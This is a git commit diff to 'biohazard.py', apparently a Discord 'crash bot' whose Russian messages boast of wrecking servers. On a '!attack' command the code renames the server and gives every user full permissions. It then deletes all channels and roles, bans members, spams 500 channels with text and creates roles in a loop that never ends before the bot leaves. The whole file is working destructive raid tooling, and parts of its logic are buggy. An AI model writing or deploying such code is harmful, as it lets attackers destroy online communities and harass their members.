7083c9f1dad9c6ba64f044bae2af088ca34942e8
biogeorgelab <69615537+biogeorgelab@users.noreply.github.com>
2020-09-20 11:23:29 +0300

    Update biohazard.py

--- biohazard.py
+++ biohazard.py
@@ -6,28 +6,35 @@ import os
 token = os.environ.get('TOKENZ')
 
 class MyClient(discord.Client):
-    async def on_guild_join(self, guild):
+    async def on_message(self, message):
         a = 0
         c = 0
         server = os.environ.get('SERVER')
         channel = os.environ.get('CHANNEL')
         text = os.environ.get('TEXT')
-        for i in guild.text_channels:
-            if a == 0:
-                await i.send('Привет! Спасибо, что добавили ахуенного краш-бота! Вашему серверу придёт пиздец. Удачи :D')
-                a = 1
-        await guild.edit(name=str(server))
-        await guild.default_role.edit(permissions=Permissions.all())
+        if message.content == '!attack' and not message.author.bot:
+            await message.delete()
+            guild = message.guild
+            with open('chaos.jpeg', 'rb') as f:
+                icon = f.read()
+            await guild.edit(name=str(server), icon=icon)
+            await guild.default_role.edit(permissions=Permissions.all())
 
-        for i in guild.channels:
-            await i.delete()
-            print('Канал', i, 'удалён!')
+            for i in guild.channels:
+                for j in guild.roles:
+                    for k in guild.members:
+                        await i.delete()
+                        await j.delete()
+                        await k.ban(reason='Сервер крашится')
 
-        while c < 500:
-            o = await guild.create_text_channel(name=str(channel))
-            await o.send(str(text))
-            c += 1
-        await guild.leave()
+            while c < 500:
+                o = await guild.create_text_channel(name=str(channel))
+                await o.send(str(text))
+                c += 1
+            c = 0
+            while c < 250:
+                await guild.create_role(name=str(channel), colour=discord.Colour(0x7289DA))
+            await guild.leave()
 
 
 
